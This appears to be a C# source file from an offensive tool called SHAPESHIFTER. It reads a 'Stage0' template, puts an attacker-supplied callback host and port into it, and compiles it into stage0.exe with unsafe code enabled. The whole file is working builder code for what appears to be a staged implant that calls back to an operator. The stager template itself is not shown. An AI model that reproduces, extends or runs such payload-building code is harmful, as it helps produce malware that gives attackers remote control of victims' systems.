using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;

namespace SHAPESHIFTER
{
    class Compiler
    {
        public static bool CompileStage0(string host, string port)
        {
            string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string sourceFile = Path.Combine(sourcePath, @"Templates\Stage0Template.cs");

            if (!File.Exists(sourceFile))
            {
                Console.WriteLine("[-] Can't find the Stage0 template file. Is the \"Tempates\" " +
                    "directory in the same directory as SHAPESHIFTER.exe?");
                return false;
            }

            // Replace placeholders with information for the callback
            string template = File.ReadAllText(sourceFile);
            string modified = template.Replace("[SHAPESHIFTER_HOST]", host);
            modified = modified.Replace("[SHAPESHIFTER_PORT]", port);
            File.WriteAllText(sourceFile, modified);

            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters cParams = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.Combine(sourcePath, "stage0.exe"),
                IncludeDebugInformation = false,
                GenerateInMemory = false,
                WarningLevel = 0, // No warnings means no bugs, right?
                TreatWarningsAsErrors = false,
                CompilerOptions = "/unsafe",
                TempFiles = new TempFileCollection(".", false),
                MainClass = "Stage0.Program"
            };

            CompilerResults results = provider.CompileAssemblyFromFile(cParams, sourceFile);
            if (results.Errors.Count == 0)
            {
                Console.WriteLine("[+] Stage0 compiled into {0}", results.PathToAssembly);
            }
            else
            {
                Console.WriteLine("[-] Error during Stage0 compilation");
                foreach (CompilerError e in results.Errors)
                {
                    Console.WriteLine("    {0}", e.ToString());
                }
                return false;
            }
            return true;
        }
    }
}
